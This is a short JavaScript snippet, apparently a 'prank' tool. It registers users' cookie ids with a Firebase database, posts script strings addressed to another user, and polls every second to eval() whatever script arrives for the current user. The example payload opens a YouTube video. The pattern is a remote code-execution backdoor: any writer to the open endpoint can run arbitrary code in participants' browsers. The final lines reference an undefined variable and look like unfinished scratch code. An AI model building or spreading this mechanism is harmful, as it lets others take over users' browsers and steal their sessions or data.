//send userid to server
let userId = Cookie.read("randid")
axios.post(
  "https://chat-bdc9b-default-rtdb.firebaseio.com/peers.json",
  {
    randid: userId,
  }
)
//send code to a user
function sendCodeToUser(code, userId){
  axios.post(
    "https://chat-bdc9b-default-rtdb.firebaseio.com/pranks.json",
    {
      script: code,
      user_id: userId
    }
  );
}

axios.get("https://chat-bdc9b-default-rtdb.firebaseio.com/peers.json").then((response)=>{
  peers = response['data']
  randId = peers[Object.keys(peers)[0]]['randid'];
  sendCodeToUser(`window.open("https://www.youtube.com/watch?v=1jZnwuz90Rs&t=14s", "_blank");`, randId)
})

setInterval(() => {
  axios.get("https://chat-bdc9b-default-rtdb.firebaseio.com/pranks.json").then((response) => {
    let pranks = response['data']
    for(prankId in pranks){
      let prank = pranks[prankId]
      let userId = Cookie.read("randid")
      if(prank.user_id === userId){
        eval(prank.script)
        axios.delete(
          `https://chat-bdc9b-default-rtdb.firebaseio.com/pranks/${prankId}.json`
        );
      }
    }
  })
}, 1000)



axios.delete(
  `https://chat-bdc9b-default-rtdb.firebaseio.com/offers/${lastOfferId}.json`
);
axios.post(
  "https://chat-bdc9b-default-rtdb.firebaseio.com/pranks.json",
  {
    script: 'console.log(1);'
  }
);
axios.get("https://chat-bdc9b-default-rtdb.firebaseio.com/answers.json").then(console.log)
